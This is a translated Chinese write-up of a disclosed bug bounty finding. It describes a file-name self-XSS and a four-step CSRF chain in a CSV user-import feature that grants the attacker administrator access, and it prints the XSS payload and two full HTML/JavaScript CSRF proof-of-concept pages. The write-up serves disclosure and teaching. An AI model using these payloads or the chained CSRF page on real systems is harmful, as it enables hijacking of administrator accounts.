***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

 **![
从XSS漏洞到四步CSRF利用实现账户劫持](https://image.3001.net/images/20190510/1557478120_5cd53ae8dc566.png!small)**
**作者前不久在HackerOne上参加了一个漏洞众测邀请项目，目标测试应用（系统）的功能是为一些企业托管相关服务，普通用户可以通过该系统进行注册，然后使用这些服务。所以，该应用中会涉及到很多用户的敏感信息处理操作。后来，作者由一个XSS漏洞入手，发现了上传功能中存在的四步CSRF漏洞隐患，最终经过构造实现了目标应用的管理员账户劫持。**

## 在上传文件名处发现XSS漏洞

项目开始前两天，我就发现了几个中危漏洞，并对它们做了一些分析标记，经深入研究之后，我意识到只要利用一个XSS漏洞，就能非常容易地实现提权。另外，由于更改用户注册邮箱时，目标应用没有诸如向邮箱发更改链接或输入当前密码的验证手段，所以综合漏洞利用，可形成账户劫持。为此，我花了好多时间去挖XSS漏洞。

但难处在于，由于目标应用对用户输入做了特殊字符过滤处理，所以貌似很难发现XSS漏洞。之后某天晚上，在继续测试过程中，我注意到，目标应用可以上传CSV文件来导入用户信息，这个功能估计值得深挖。于是，我在上传CSV文件中构造了一些特殊字符，但还是被过滤掉了。接着，我又从CSV文件名入手，在其中构造了XSS
语句：

> <img src=x onerror=alert(document.domain)>.csv

终于实现了alert的窗口弹出！好了，大功告成。

## XSS综合CSRF的尝试

但在后续分析中，我意识到即使构造的文件名XSS是持久型的，这个XSS漏洞目前只能在CSV文件上传时实现触发。也就是说，在CSV文件上传时，应用未做相关编码过滤处理，但文件上传到系统服务端后是受编码过滤的。因此来看，这个XSS漏洞目前也仅只是一个Self-XSS，是不在漏洞认可范围内的。尽管我试了很多XSS Payload，但还是不能绕过上传后的服务端过滤机制，无法转变这种Self-XSS。

此时，我只有把它暂时放一放，希望在后续测试中能发现绕过方法或其它利用方式。接下来，在继续测试后，我发现目标应用竟然没有CSRF防护机制，所以，我就想到，能不能用CSRF请求来触发这个Self-XSS呢？于是，我就立马动手编写了一个CSRF请求脚本，如下：

    
    
    <html>
    
        <body>
    
        <script>history.pushState('', '', '/')</script>
    
          <script>
    
            var uploadId = UPDATE_THIS_WITH_ID;
    
            function submitRequest() {
    
                var xhr = new XMLHttpRequest();
    
                xhr.open("POST", `<https://company.com/users/uploadFile?uploadId=>${uploadId}`, true);
    
                xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8");
    
                xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
    
                xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------1566359571913061724703232384");
    
                xhr.withCredentials = true;
    
                var body = "-----------------------------1566359571913061724703232384\r\n" +
    
                    "Content-Disposition: form-data; name=\"uploadedFile\"; filename=\"<img src=x onerror=alert(document.domain)>.csv\"\r\n" +
    
                    "Content-Type: text/csv\r\n" +
    
                    "\r\n" +
    
                    "Company,User ID,LAST NAME,FIRST NAME,Access,Type,Email\r\n" +
    
                    "H1 Company,999,Takeover,Account,System Admin,Administrator,neemaPoC@gmail.com\r\n" + 
    
                   "-----------------------------1566359571913061724703232384\r\n" +
    
                    "Content-Disposition: form-data; name=\"rosterType\"\r\n" + 
    
                    "\r\n" +
    
                    "staff\r\n" + 
    
                    "-----------------------------1566359571913061724703232384\r\n" +
    
                    "Content-Disposition: form-data; name=\"importMethod\"\r\n" +
    
                    "\r\n" +
    
                    "updateAdd\r\n" +
    
                    "-----------------------------1566359571913061724703232384--\r\n";
    
                var aBody = new Uint8Array(body.length);
    
                for (var i = 0; i < aBody.length; i++)                 
    
                    aBody[i] = body.charCodeAt(i);
    
                xhr.send(new Blob([aBody]));
    
            </script>
    
            <form action="#">
    
                <input type="button" value="Submit request" onclick="submitRequest();" />
    
            </form>
    
        </body>
    
    </html>

这个CSRF脚本内容是上传CSV文件的POST请求，好了，CSRF脚本有了，那么就需要在目标应用中找到一个路径或端点（endpoint），构造请求，发送给受害者用户，以此实现XSS漏洞触发了。但是，一经测试，又发现目标应用中几乎所有路径或端点（endpoint）都有过滤防护措施，所以我在脚本中构造的文件名XSS
Payload - filename=\"<img src=x onerror=alert(document.domain)>.csv\"
也就无法被解析触发了。即使我尝试了很多重定向跳转和其它技巧，但仍然未找到可行方法。没有思绪，我决定暂时先放一放。

## 突发灵感-抛弃XSS用CSRF实现管理员账户劫持

两天过后的某晚，在和媳妇看电视的时候，我突发灵感：XSS的实现利用现在可能是一叶障目，为什么不先把那个Self-XSS放一边，直接去利用CSRF呢？因此，我需要再深入了解CSV文件的上传过程，完整的CSV上传过程主要包含以下四个过程，这几个过程中都会涉及一些用户信息的修改添加解析：

> 1、发起POST请求执行上传动作（POST - 1）
>
> 2、修复上传过程的错误（GET-1）
>
> 3、解析上传文件中的相关修改之处，以便进行后续的预览和验证（GET - 2）
>
> 4、解析并实现预览，最终提交上传

经分析测试，第1步的POST请求中存在CSRF漏洞可能，之后的三步GET请求也都存在CSRF漏洞隐患。但整体利用可能有点麻烦，因为不确定这些步骤如何执行，而且后来我才发现其中还遗漏了一步。其次，目标应用需要在上传错误修复之前实现一次查看检查，所以，还需要在以上第1和第2步之间再插入一个检查步骤。另外，目标应用的CORS配置也比较合理，当调用各种端点路径（Endpoint）时，无法获得任何响应数据。因为这种响应数据对了解以上每个步骤的当前状态非常有用，就比如可以通过响应返回时间推断上传数据的大小、网速、服务器负载等情况。

我决定对每个请求处理完成的平均时间做一些测试，然后使用Javascript中的setTimeout方法来对4个请求实现交错执行，以确保我可以一次把这4步中的CSRF漏洞进行串联整合。所以，最终漏洞利用PoC代码如下：

    
    
    <html>
    
       <body>
    
       <script>history.pushState('', '', '/')</script>
    
         <script>
    
           var uploadId = UPDATE_THIS_WITH_ID;
    
           
    
           function xhrRequest(url) {
    
               var xhr = new XMLHttpRequest();
    
               xhr.open('GET', url);
    
               xhr.withCredentials = true;
    
               xhr.send(null);
    
           }
    
           function submitRequest() {
    
             var xhr = new XMLHttpRequest();
    
             xhr.open("POST", `<https://company.com/users/uploadFile?uploadId=>${uploadId}`, true);
    
             xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8");
    
             xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
    
             xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------1566359571913061724703232384");
    
             xhr.withCredentials = true;
    
             var body = "-----------------------------1566359571913061724703232384\r\n" +
    
                "Content-Disposition: form-data; name=\"uploadedFile\"; filename=\"neema.csv\"\r\n" +
    
                "Content-Type: text/csv\r\n" +
    
                "\r\n" +
    
                "Company,User ID,LAST NAME,FIRST NAME,Access,Type,Email\r\n" +
    
                "Company,999,Takeover,Account,System Admin,Administrator,neemaPoC@gmail.com\r\n" +
    
                "-----------------------------1566359571913061724703232384\r\n" +
    
                "Content-Disposition: form-data; name=\"rosterType\"\r\n" +
    
                "\r\n" +
    
                "staff\r\n" +
    
                "-----------------------------1566359571913061724703232384\r\n" +
    
                "Content-Disposition: form-data; name=\"importMethod\"\r\n" +
    
                "\r\n" +
    
                "updateAdd\r\n" +
    
                "-----------------------------1566359571913061724703232384--\r\n";
    
             var aBody = new Uint8Array(body.length);
    
             for (var i = 0; i < aBody.length; i++)
    
               aBody[i] = body.charCodeAt(i);
    
             xhr.send(new Blob([aBody]));
    
             window.setTimeout(function () {           window.open(`<https://company.com/users/upload?uploadId=>${uploadId}`);
    
               window.setTimeout(function() {
    
                 xhrRequest(`<https://company.com/users/fix?uploadId=>${uploadId}`);
    
                 window.setTimeout(function () {
    
                   xhrRequest(`<https://company.com/users/submitToPreview?uploadId=>${uploadId}`);
    
                   window.setTimeout(function () {
    
                     xhrRequest(`<https://company.com/users/submitImport?uploadId=>${uploadId}`);
    
                   }, 2000)
    
                 }, 2000)
    
               }, 2000)
    
             }, 2000)
    
           }
    
         </script>
    
         <form action="#">
    
           <input type="button" value="Submit request" onclick="submitRequest();" />
    
         </form>
    
       </body>
    
     </html>

以上PoC执行的功能是：一开始发送POST请求，然后以2秒间隔执行完整CSV文件上传过程中的4个请求，这对单个用户的上传行为来说非常好控制和判断。攻击者通过网站控制部署以上这个PoC页面，如果把目标应用的管理员（Admin）当成受害者，把这个PoC对应URL链接发送给管理员，当他点击加载后，利用CSV文件上传过程中存在的4个CSRF漏洞处，结合上传CSV文件中的用户信息修改，可以实现攻击者管理员身份的添加，以此间接实现对原来管理员身份的劫持。实现机制是：攻击者提供在上传CSV文件中的邮箱会收到一封管理员身份的用户名密码链接，用该凭据登录目标应用，可以删除其它管理员账户，完全实现对管理员账户的劫持，获取对目标应用的完全管理权限。汗......。

## 漏洞上报进程

> 第一天 漏洞初报
>
> 第二天 漏洞定级分类（高危）
>
> 第三天 获得$3,000奖励
>
> 第七天 漏洞修复

 ***参考来源：[medium](https://medium.com/a-bugz-life/4x-csrfs-chained-for-company-account-takeover-f9fada416986)，clouds编译，转载请注明来自FreeBuf.COM**  

